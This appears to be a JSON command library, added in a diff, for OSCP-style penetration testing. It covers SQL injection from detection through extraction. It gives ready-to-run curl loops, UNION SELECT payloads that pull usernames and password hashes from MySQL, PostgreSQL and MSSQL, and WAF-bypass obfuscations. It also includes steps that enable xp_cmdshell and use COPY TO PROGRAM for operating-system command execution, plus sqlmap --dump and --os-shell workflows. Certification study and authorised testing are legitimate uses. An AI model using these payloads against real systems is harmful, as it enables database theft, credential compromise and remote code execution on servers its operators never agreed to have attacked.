@@ -1,0 +1,590 @@
+{
+  "category": "web",
+  "description": "SQL Injection detection and exploitation workflow commands",
+  "commands": [
+    {
+      "id": "sqli-detection-error",
+      "name": "SQL Injection Detection (Error-Based)",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "curl -s '<URL>' | grep -iE 'error|warning|mysql|syntax|postgresql|mssql|oracle|sqlite'",
+      "description": "Detect SQL injection vulnerabilities by triggering database errors with single quote payload",
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "DETECTION",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "INJECTION",
+        "MSSQL",
+        "MYSQL",
+        "ORACLE",
+        "OSCP:HIGH",
+        "POSTGRESQL",
+        "QUICK_WIN",
+        "SQLI",
+        "SQL_INJECTION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target URL with SQLi payload appended (e.g., http://target/page.php?id=1')",
+          "example": "http://192.168.45.100/page.php?id=1'",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "-s": "Silent mode - suppresses curl progress meter and error messages",
+        "-i": "Case-insensitive grep - matches ERROR, error, Error",
+        "-E": "Extended regex - enables alternation (|) and other regex features",
+        "error|warning": "Common database error keywords indicating SQL syntax issues",
+        "mysql|postgresql|mssql": "Database-specific keywords revealing backend type"
+      },
+      "success_indicators": [
+        "You have an error in your SQL syntax",
+        "Warning: mysql_fetch_array()",
+        "pg_query(): Query failed: ERROR:",
+        "Microsoft SQL Server Native Client error",
+        "ORA-01756: quoted string not properly terminated",
+        "SQLite3::query(): Unable to prepare statement"
+      ],
+      "failure_indicators": [
+        "No error messages in response",
+        "Page returns normally without changes",
+        "404 Not Found",
+        "403 Forbidden (WAF/IDS blocking)",
+        "Generic error page without database details"
+      ],
+      "next_steps": [
+        "sqli-column-enum-orderby",
+        "sqli-union-select-basic",
+        "sqlmap-post-exploitation"
+      ],
+      "alternatives": [
+        "sqlmap-post-exploitation"
+      ],
+      "prerequisites": [],
+      "troubleshooting": {
+        "no_errors": "Try alternative payloads: 1' OR '1'='1 (boolean), 1' AND SLEEP(5)-- (time-based), 1') OR ('1'='1 (closing parenthesis). Encode characters: %27 instead of single quote.",
+        "waf_blocking": "Use tamper scripts with sqlmap. Try double encoding: %2527. Add spaces: 1' OR '1' = '1. Use comments: 1'/**/OR/**/1=1--",
+        "false_positives": "Verify with time-based blind: curl -s 'URL?id=1' AND SLEEP(5)--' -w '%{time_total}'. Response time >5 seconds confirms SQLi.",
+        "connection_refused": "Verify target is reachable: ping <TARGET>. Check port: sudo nmap -p 80,443 -Pn -v <TARGET>",
+        "https_certificate_errors": "Add -k flag to curl: curl -k -s '<URL>' for self-signed certificates"
+      },
+      "notes": "First step in manual SQLi exploitation.\n\nALWAYS test multiple payloads (single quote, double quote, parenthesis).\n\nError messages reveal:\n(1) Database type (MySQL/PostgreSQL/MSSQL), (2) Query structure, (3) Column names/table names.\n\nDocument ALL findings in investigation_checklist.md.\n\nFor OSCP:\nMaster manual techniques BEFORE using sqlmap.\n\nTime estimate:\n5-10 minutes for initial detection.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "sqli-column-enum-orderby",
+      "name": "SQL Injection Column Enumeration (ORDER BY)",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "for i in {1..<MAX_COLS>}; do echo \"Testing column $i\"; curl -s '<URL> ORDER BY $i-- -' | grep -i error && echo \"Failed at column $i\" && break; done",
+      "description": "Enumerate number of columns in SQL query using ORDER BY technique (required before UNION SELECT)",
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "DISCOVERY",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Base URL with vulnerable parameter (without payload)",
+          "example": "http://192.168.45.100/page.php?id=1",
+          "required": true
+        },
+        {
+          "name": "<MAX_COLS>",
+          "description": "Maximum columns to test (default 20 is usually sufficient)",
+          "example": "20",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "ORDER BY": "Orders result set by column number - errors when column number exceeds total columns",
+        "$i": "Loop variable incrementing from 1 to MAX_COLS",
+        "-- -": "SQL comment syntax (double dash space dash) - comments out rest of query. Alternative: #, /* */",
+        "grep -i error": "Detects when ORDER BY number is too high (column doesn't exist)",
+        "break": "Exits loop when first error occurs (found max column count)"
+      },
+      "success_indicators": [
+        "Script completes without errors (all columns tested)",
+        "Error appears at specific column number (e.g., 'Failed at column 5')",
+        "Last successful column = total columns in query",
+        "Unknown column '5' in 'order clause'"
+      ],
+      "failure_indicators": [
+        "All iterations return errors (wrong injection point)",
+        "No errors at any column number (not vulnerable or different syntax needed)",
+        "Connection timeouts (WAF rate limiting)",
+        "Same response for all column numbers (caching/static page)"
+      ],
+      "next_steps": [
+        "sqli-union-select-basic",
+        "sqli-union-mysql-info",
+        "sqli-union-postgresql-info",
+        "sqli-union-mssql-info"
+      ],
+      "alternatives": [
+        "sqlmap-post-exploitation"
+      ],
+      "prerequisites": [
+        "sqli-detection-error"
+      ],
+      "troubleshooting": {
+        "all_columns_error": "Try alternative syntax: ORDER BY $i# (MySQL), ORDER BY $i;-- (MSSQL), ORDER BY $i--+ (URL-encoded space)",
+        "no_errors_detected": "Test manually: curl -s 'URL ORDER BY 100-- -' should error. If not, use time-based: ORDER BY $i AND SLEEP(1)-- -",
+        "waf_blocking": "Add delays: sleep 1 between iterations. Use different comment styles: /*, #, ;--",
+        "parenthesis_needed": "Try: ORDER BY $i)-- - or ORDER BY $i))-- - if query has nested parentheses",
+        "union_alternative": "If ORDER BY fails, try UNION SELECT NULL,NULL,...NULL incrementally until no error"
+      },
+      "notes": "CRITICAL step for UNION-based SQLi.\n\nColumn count MUST match between original query and UNION SELECT.\n\nManual alternative:\nTest ORDER BY 1, ORDER BY 2, ORDER BY 3...\n\nuntil error.\n\nWhen error occurs at column N, original query has N-1 columns.\n\nExample:\nError at ORDER BY 5 = query has 4 columns.\n\nTime estimate:\n2-5 minutes.\n\nDocument column count in investigation_checklist.md for UNION exploitation phase.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "sqli-union-select-basic",
+      "name": "SQL Injection UNION SELECT (Basic Extraction)",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "curl -s '<URL> UNION SELECT <NULL_COLUMNS>-- -'",
+      "description": "Test UNION SELECT injection and identify which columns are displayed on page (required for data extraction)",
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Base URL with vulnerable parameter set to invalid value (e.g., id=-1 to suppress original results)",
+          "example": "http://192.168.45.100/page.php?id=-1",
+          "required": true
+        },
+        {
+          "name": "<NULL_COLUMNS>",
+          "description": "Comma-separated NULL values matching column count from ORDER BY enumeration (e.g., 'test1',NULL,NULL,'test2' for 4 columns)",
+          "example": "'test1',NULL,NULL,'test2'",
+          "required": true
+        }
+      ],
+      "flag_explanations": {
+        "UNION SELECT": "Combines results from injected query with original query results",
+        "NULL": "Placeholder value compatible with any data type (prevents type mismatch errors)",
+        "id=-1": "Invalid ID ensures original query returns zero rows, making injected data visible",
+        "'test1','test2'": "String markers to identify which column positions appear on page",
+        "-- -": "SQL comment - ignores rest of original query (prevents syntax errors)"
+      },
+      "success_indicators": [
+        "Test strings ('test1', 'test2') visible in page HTML",
+        "Identify column positions: 'test1' in position 1, 'test2' in position 4",
+        "Page displays injected data without errors",
+        "Different content than original query results"
+      ],
+      "failure_indicators": [
+        "The used SELECT statements have a different number of columns (column count mismatch)",
+        "Test strings not visible on page (not displayed columns)",
+        "Original query results still showing (need id=-1 or invalid value)",
+        "Page returns blank/error (syntax issue or WAF)"
+      ],
+      "next_steps": [
+        "sqli-union-mysql-info",
+        "sqli-union-postgresql-info",
+        "sqli-union-mssql-info"
+      ],
+      "alternatives": [
+        "sqlmap-post-exploitation"
+      ],
+      "prerequisites": [
+        "sqli-detection-error",
+        "sqli-column-enum-orderby"
+      ],
+      "troubleshooting": {
+        "column_mismatch": "Recount columns with ORDER BY. Ensure NULL count matches exactly. Example: 4 columns = NULL,NULL,NULL,NULL",
+        "strings_not_visible": "Try different positions: 'test1',NULL,NULL,NULL then NULL,'test2',NULL,NULL. Check page source (Ctrl+U) - strings may be in hidden fields/comments",
+        "type_conversion_error": "Replace all NULLs with strings: 'a','b','c','d' or all integers: 1,2,3,4 depending on database",
+        "waf_blocking_union": "Obfuscate: UNION/**/SELECT, UNI/**/ON/**/SEL/**/ECT, union+select (URL encoding)",
+        "no_results_displayed": "Original query may have WHERE clause: try id=1 UNION instead of id=-1. Check if results are JSON/XML (not HTML)"
+      },
+      "notes": "FOUNDATION of UNION-based SQLi exploitation.\n\nOnce you identify displayed columns (e.g., columns 2 and 4 visible), ALL future queries use those positions for data extraction.\n\nExample workflow:\n(1) Enumerate columns:\n4 total, (2) Test visibility:\n'test1',NULL,NULL,'test2', (3) Identify:\ncolumns 1 and 4 are displayed, (4) Extract data:\ndatabase(),user(),NULL,version().\n\nTime estimate:\n5-10 minutes.\n\nALWAYS test with invalid id first (id=-1) to avoid mixing original and injected results.\n\nDocument displayed column positions in investigation_checklist.md.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "sqli-union-mysql-info",
+      "name": "SQL Injection UNION SELECT (MySQL Information Extraction)",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'",
+      "description": "Extract MySQL database information using UNION SELECT injection (database names, table names, column names, data)",
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "INJECTION",
+        "MYSQL",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Base URL with vulnerable parameter set to invalid value",
+          "example": "http://192.168.45.100/page.php?id=-1",
+          "required": true
+        },
+        {
+          "name": "<PAYLOAD>",
+          "description": "MySQL information_schema query (see notes for examples)",
+          "example": "CONCAT(table_schema,':',table_name)",
+          "required": true
+        },
+        {
+          "name": "<EMPTY_COLS>",
+          "description": "Remaining NULL columns to match total column count",
+          "example": "NULL,NULL,NULL",
+          "required": true
+        },
+        {
+          "name": "<SEARCH_TERM>",
+          "description": "Keyword to grep for extracted data (optional)",
+          "example": "users",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "information_schema": "MySQL system database containing metadata about all databases, tables, columns",
+        "CONCAT()": "MySQL function to combine multiple values into single string (column limitation workaround)",
+        "table_schema": "Database name in information_schema.tables",
+        "table_name": "Table name in information_schema.tables",
+        "column_name": "Column name in information_schema.columns",
+        "GROUP_CONCAT()": "Combines multiple rows into single comma-separated string (extracts all tables at once)",
+        "0x3a": "Hexadecimal for colon (:) - delimiter for concatenated values"
+      },
+      "success_indicators": [
+        "Database names visible: information_schema, mysql, webapp_db",
+        "Table names visible: users, admin, credentials",
+        "Column names visible: username, password, email",
+        "Actual data extracted: admin:5f4dcc3b5aa765d61d8327deb882cf99",
+        "Multiple results separated by colon or comma"
+      ],
+      "failure_indicators": [
+        "Empty response (wrong column position)",
+        "Original query results (need id=-1)",
+        "Syntax error (column count mismatch or wrong MySQL function)",
+        "Access denied to information_schema (rare but possible)"
+      ],
+      "next_steps": [
+        "sqlmap-post-exploitation"
+      ],
+      "alternatives": [
+        "sqlmap-post-exploitation"
+      ],
+      "prerequisites": [
+        "sqli-detection-error",
+        "sqli-column-enum-orderby",
+        "sqli-union-select-basic"
+      ],
+      "troubleshooting": {
+        "no_data_visible": "Verify column position: Use 'test' instead of PAYLOAD to confirm visibility. Move PAYLOAD to different column position.",
+        "concat_not_working": "Try CONCAT_WS(':',col1,col2) or col1||':'||col2 (standard SQL concatenation)",
+        "too_many_results": "Add LIMIT clause: FROM information_schema.tables LIMIT 0,10. Or use WHERE: WHERE table_schema='webapp_db'",
+        "access_denied": "Try direct table access if you know table names: UNION SELECT username,password,NULL,NULL FROM users",
+        "encoding_issues": "Use HEX() function: HEX(username) then decode manually, or LOAD_FILE() for file reading"
+      },
+      "notes": "MySQL-SPECIFIC extraction queries (order matters):\n(1) List databases:\ndatabase() or CONCAT(schema_name) FROM information_schema.schemata.\n\n(2) List tables:\nCONCAT(table_schema,':',table_name) FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema').\n\n(3) List columns:\nCONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema='target_db'.\n\n(4) Extract data:\nCONCAT(username,':',password) FROM users.\n\nUse GROUP_CONCAT() to get all rows:\nGROUP_CONCAT(username,':',password SEPARATOR '|') FROM users.\n\nTime estimate:\n10-20 minutes for full database enumeration.\n\nOSCP TIP:\nAlways check for 'users', 'admin', 'credentials', 'accounts' tables.\n\nDocument findings in investigation_checklist.md.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "sqli-union-postgresql-info",
+      "name": "SQL Injection UNION SELECT (PostgreSQL Information Extraction)",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'",
+      "description": "Extract PostgreSQL database information using UNION SELECT injection (databases, tables, columns, data, file read)",
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "POSTGRESQL",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Base URL with vulnerable parameter set to invalid value",
+          "example": "http://192.168.45.100/page.php?id=-1",
+          "required": true
+        },
+        {
+          "name": "<PAYLOAD>",
+          "description": "PostgreSQL pg_catalog query (see notes for examples)",
+          "example": "table_name||':'||column_name",
+          "required": true
+        },
+        {
+          "name": "<EMPTY_COLS>",
+          "description": "Remaining NULL columns to match total column count",
+          "example": "NULL,NULL,NULL",
+          "required": true
+        },
+        {
+          "name": "<SEARCH_TERM>",
+          "description": "Keyword to grep for extracted data (optional)",
+          "example": "users",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "pg_catalog": "PostgreSQL system schema containing metadata (equivalent to MySQL information_schema)",
+        "information_schema": "Standard SQL schema also available in PostgreSQL (alternative to pg_catalog)",
+        "||": "PostgreSQL concatenation operator (joins strings)",
+        "table_name||':'||column_name": "Concatenates table and column name with colon separator",
+        "CAST()": "Type conversion function (sometimes needed for NULL compatibility)",
+        "version()": "Returns PostgreSQL version string"
+      },
+      "success_indicators": [
+        "PostgreSQL version visible: PostgreSQL 12.9 on x86_64-pc-linux-gnu",
+        "Database name visible: current_database() = webapp",
+        "Table names visible: pg_tables, users, admin",
+        "Column names visible: username, password, email",
+        "Data extracted: admin:5f4dcc3b5aa765d61d8327deb882cf99"
+      ],
+      "failure_indicators": [
+        "Empty response (wrong column position)",
+        "Syntax error (PostgreSQL uses || not CONCAT)",
+        "Type mismatch error (need CAST to text)",
+        "Access denied to pg_catalog (restricted permissions)"
+      ],
+      "next_steps": [
+        "sqlmap-post-exploitation"
+      ],
+      "alternatives": [
+        "sqlmap-post-exploitation"
+      ],
+      "prerequisites": [
+        "sqli-detection-error",
+        "sqli-column-enum-orderby",
+        "sqli-union-select-basic"
+      ],
+      "troubleshooting": {
+        "concat_syntax_error": "PostgreSQL uses || not CONCAT(): 'string1'||'string2'. Replace CONCAT(a,b) with a||b",
+        "type_mismatch": "Cast to text: CAST(column AS text) or column::text. Example: NULL::text,payload::text,NULL::text",
+        "no_data_visible": "Verify column position with 'test'::text. Move payload to displayed column from sqli-union-select-basic",
+        "access_denied_pg_catalog": "Use information_schema instead: FROM information_schema.tables. Or try direct table access if you know names.",
+        "file_read_failed": "Use pg_read_file() requires superuser. Alternative: COPY (SELECT '') TO PROGRAM 'cat /etc/passwd' (PostgreSQL 9.3+)"
+      },
+      "notes": "PostgreSQL-SPECIFIC extraction queries (syntax differs from MySQL):\n(1) Version/User:\nversion() or current_user().\n\n(2) Current database:\ncurrent_database().\n\n(3) List tables:\ntable_name FROM information_schema.tables WHERE table_schema='public'.\n\n(4) List columns:\ntable_name||':'||column_name FROM information_schema.columns WHERE table_schema='public'.\n\n(5) Extract data:\nusername||':'||password FROM users.\n\n(6) File read:\npg_read_file('/etc/passwd',0,1000) requires superuser.\n\n(7) Command execution:\nCOPY (SELECT '') TO PROGRAM 'id' (PostgreSQL 9.3+ with superuser).\n\nOSCP TIP:\nPostgreSQL often has 'postgres' superuser with weak password.\n\nTest default credentials.\n\nTime estimate:\n10-20 minutes.\n\nDocument in investigation_checklist.md.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "sqli-union-mssql-info",
+      "name": "SQL Injection UNION SELECT (MSSQL Information Extraction)",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "curl -s '<URL> UNION SELECT <PAYLOAD>,<EMPTY_COLS>-- -' | grep -i '<SEARCH_TERM>'",
+      "description": "Extract Microsoft SQL Server information using UNION SELECT injection (databases, tables, columns, xp_cmdshell RCE)",
+      "tags": [
+        "CURL",
+        "DATABASE",
+        "ENUMERATION",
+        "EXPLOITATION",
+        "EXTRACTION",
+        "IIS",
+        "INJECTION",
+        "MSSQL",
+        "OSCP:HIGH",
+        "RCE",
+        "REMOTE_CODE_EXECUTION",
+        "SQLI",
+        "SQL_INJECTION",
+        "UNION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Base URL with vulnerable parameter set to invalid value",
+          "example": "http://192.168.45.100/page.aspx?id=-1",
+          "required": true
+        },
+        {
+          "name": "<PAYLOAD>",
+          "description": "MSSQL system table query (see notes for examples)",
+          "example": "name+':'+type_desc",
+          "required": true
+        },
+        {
+          "name": "<EMPTY_COLS>",
+          "description": "Remaining NULL columns to match total column count",
+          "example": "NULL,NULL,NULL",
+          "required": true
+        },
+        {
+          "name": "<SEARCH_TERM>",
+          "description": "Keyword to grep for extracted data (optional)",
+          "example": "users",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "sys.databases": "MSSQL system view containing all database names",
+        "sys.tables": "System view containing all tables in current database",
+        "sys.columns": "System view containing all columns",
+        "+": "MSSQL concatenation operator (joins strings)",
+        "CAST()": "Type conversion (INT to VARCHAR for concatenation)",
+        "@@version": "MSSQL global variable - returns version string",
+        "xp_cmdshell": "MSSQL extended stored procedure for OS command execution (requires sysadmin)"
+      },
+      "success_indicators": [
+        "MSSQL version visible: Microsoft SQL Server 2019",
+        "Database names visible: master, tempdb, model, msdb, webapp_db",
+        "Table names visible: users, admin, credentials",
+        "Column names visible: username, password, email",
+        "xp_cmdshell output visible (if sysadmin): nt authority\\system"
+      ],
+      "failure_indicators": [
+        "Empty response (wrong column position)",
+        "Syntax error (MSSQL uses + not || or CONCAT)",
+        "Type conversion error (need CAST for INT columns)",
+        "xp_cmdshell disabled (default in modern MSSQL)",
+        "Access denied (need sysadmin for xp_cmdshell)"
+      ],
+      "next_steps": [
+        "sqlmap-post-exploitation"
+      ],
+      "alternatives": [
+        "sqlmap-post-exploitation"
+      ],
+      "prerequisites": [
+        "sqli-detection-error",
+        "sqli-column-enum-orderby",
+        "sqli-union-select-basic"
+      ],
+      "troubleshooting": {
+        "concat_syntax_error": "MSSQL uses + not ||: 'string1'+'string2'. Replace || with +",
+        "type_conversion_error": "Cast integers: CAST(column AS VARCHAR). Example: name+':'+CAST(object_id AS VARCHAR)",
+        "no_data_visible": "Test column position with 'test' string. Verify displayed columns from sqli-union-select-basic",
+        "xp_cmdshell_disabled": "Enable with: EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; (requires sysadmin). Alternative: use OPENROWSET for file read",
+        "access_denied_sys_tables": "Try information_schema: FROM information_schema.tables. Or direct table access: FROM dbo.users",
+        "waf_blocking_xp_cmdshell": "Obfuscate: xp/**/_cmd/**/shell or DECLARE @x VARCHAR(100); SET @x='xp_cmdshell'; EXEC @x 'whoami'"
+      },
+      "notes": "MSSQL-SPECIFIC extraction queries and RCE techniques:\n(1) Version:\n@@version or SERVERPROPERTY('ProductVersion').\n\n(2) Current database:\nDB_NAME().\n\n(3) List databases:\nname FROM sys.databases (exclude system:\nWHERE name NOT IN ('master','tempdb','model','msdb')).\n\n(4) List tables:\nname+':'+type_desc FROM sys.tables.\n\n(5) List columns:\nc.name+':'+t.name FROM sys.columns c JOIN sys.tables t ON c.object_id=t.object_id.\n\n(6) Extract data:\nusername+':'+CAST(password AS VARCHAR) FROM users.\n\n(7) RCE via xp_cmdshell:\nEXEC xp_cmdshell 'whoami' (requires sysadmin role).\n\n(8) Enable xp_cmdshell:\nUNION SELECT NULL; EXEC sp_configure 'show advanced',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- (stacked queries needed).\n\nOSCP TIP:\nMSSQL often runs as 'NT AUTHORITY\\SYSTEM' - xp_cmdshell = instant SYSTEM shell.\n\nTest for stacked queries first.\n\nTime estimate:\n15-25 minutes.\n\nDocument xp_cmdshell status in investigation_checklist.md.",
+      "oscp_relevance": "high"
+    },
+    {
+      "id": "sqlmap-post-exploitation",
+      "name": "SQLMap Automated Exploitation",
+      "category": "web",
+      "subcategory": "sql-injection",
+      "command": "sqlmap -u '<URL>' --batch --dump <OPTIONS>",
+      "description": "Automated SQL injection exploitation using sqlmap (after manual verification - OSCP requires manual attempt first)",
+      "tags": [
+        "AUTOMATION",
+        "CREDENTIAL_ACCESS",
+        "DATABASE",
+        "EXPLOITATION",
+        "INJECTION",
+        "OSCP:HIGH",
+        "SQLI",
+        "SQLMAP",
+        "SQL_INJECTION",
+        "WEB"
+      ],
+      "variables": [
+        {
+          "name": "<URL>",
+          "description": "Target URL with vulnerable parameter (use * to mark injection point)",
+          "example": "http://192.168.45.100/page.php?id=1*",
+          "required": true
+        },
+        {
+          "name": "<OPTIONS>",
+          "description": "Additional sqlmap options (see flag_explanations for common options)",
+          "example": "-D webapp_db -T users --threads 5",
+          "required": false
+        }
+      ],
+      "flag_explanations": {
+        "-u": "Target URL (use * to mark injection point explicitly)",
+        "--batch": "Never ask for user input, use default behavior (essential for automation)",
+        "--dump": "Dump database table contents (retrieves all data from discovered tables)",
+        "-D": "Target specific database name (e.g., -D webapp_db)",
+        "-T": "Target specific table name (e.g., -T users)",
+        "-C": "Target specific columns (e.g., -C username,password)",
+        "--threads": "Number of concurrent threads (default 1, max 10 - faster enumeration)",
+        "--dbs": "Enumerate databases only (first step)",
+        "--tables": "Enumerate tables in database",
+        "--columns": "Enumerate columns in table",
+        "--level": "Test level (1-5, default 1 - higher = more payloads/slower)",
+        "--risk": "Risk level (1-3, default 1 - higher = more aggressive/dangerous payloads)",
+        "--technique": "Injection techniques to use (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)",
+        "--random-agent": "Use random User-Agent header (helps bypass basic WAF)",
+        "--tamper": "Tamper scripts for WAF bypass (e.g., --tamper=space2comment,between)",
+        "--os-shell": "Attempt interactive OS shell (requires stacked queries and permissions)",
+        "-p": "Specify testable parameter (e.g., -p id)"
+      },
+      "success_indicators": [
+        "sqlmap identified the following injection point(s)",
+        "Parameter: id (GET)",
+        "Type: UNION query",
+        "Database: webapp_db",
+        "Table: users",
+        "Dumped X entries from table 'users'",
+        "[INFO] fetched data logged to textfile"
+      ],
+      "failure_indicators": [
+        "all tested parameters do not appear to be injectable",
+        "target URL content is stable (false positive prevention)",
+        "connection timeout",
+        "403 Forbidden (WAF blocking)",
+        "it seems that target is protected by some kind of WAF/IPS"
+      ],
+      "next_steps": [],
+      "alternatives": [
+        "sqli-detection-error",
+        "sqli-column-enum-orderby",
+        "sqli-union-select-basic"
+      ],
+      "prerequisites": [
+        "sqli-detection-error"
+      ],
+      "troubleshooting": {
+        "not_injectable": "Verify manually first with sqli-detection-error. Try marking injection point explicitly: url?id=1* (asterisk). Use -p parameter to test specific param: -p id",
+        "waf_detected": "Use tamper scripts: --tamper=space2comment,between. Add random agent: --random-agent. Increase delay: --delay=2. Lower threads: --threads=1",
+        "connection_timeout": "Check network: ping <TARGET>. Increase timeout: --timeout=30. Use proxy: --proxy=http://127.0.0.1:8080 (with Burp)",
+        "false_positives": "Increase test level: --level=3. Specify technique: --technique=BEUST. Manual verify: compare outputs for id=1 vs id=2",
+        "slow_enumeration": "Increase threads: --threads=5. Skip constant columns: --no-cast. Use WHERE: --where='username like \"%admin%\"'",
+        "no_os_shell": "Try --os-pwn for meterpreter. Check database user: --current-user. Escalate: --sql-shell then 'SELECT IS_SRVROLEMEMBER('sysadmin')' for MSSQL"
+      },
+      "notes": "OSCP WORKFLOW REQUIREMENT:\n(1) ALWAYS attempt manual SQLi first (sqli-detection-error → sqli-column-enum-orderby → sqli-union-select-basic).\n\n(2) Document manual findings in investigation_checklist.md.\n\n(3) THEN use sqlmap for faster enumeration.\n\nCommon sqlmap workflow:\nStep 1:\nDetect injection:\nsqlmap -u 'URL' --batch.\n\nStep 2:\nEnumerate databases:\nsqlmap -u 'URL' --batch --dbs.\n\nStep 3:\nEnumerate tables:\nsqlmap -u 'URL' --batch -D webapp_db --tables.\n\nStep 4:\nDump specific table:\nsqlmap -u 'URL' --batch -D webapp_db -T users --dump.\n\nStep 5:\nAttempt OS shell:\nsqlmap -u 'URL' --batch --os-shell (MSSQL xp_cmdshell, PostgreSQL COPY).\n\nOutput location:\n~/.local/share/sqlmap/output/<TARGET>/ (check log.txt for full output).\n\nTime estimate:\n5-30 minutes depending on injection type and database size.\n\nWAF bypass:\nUse --tamper=space2comment for comments, --tamper=between for AND/OR replacement.\n\nPOST requests:\nsqlmap -u 'URL' --data='id=1&submit=Submit' (specify POST data).\n\nCookies:\n--cookie='PHPSESSID=abc123'.\n\nCustom headers:\n--headers='X-Forwarded-For:\n127.0.0.1'.\n\nREMEMBER:\nManual technique demonstrates understanding for OSCP report.",
+      "oscp_relevance": "high"
+    }
+  ]
+}
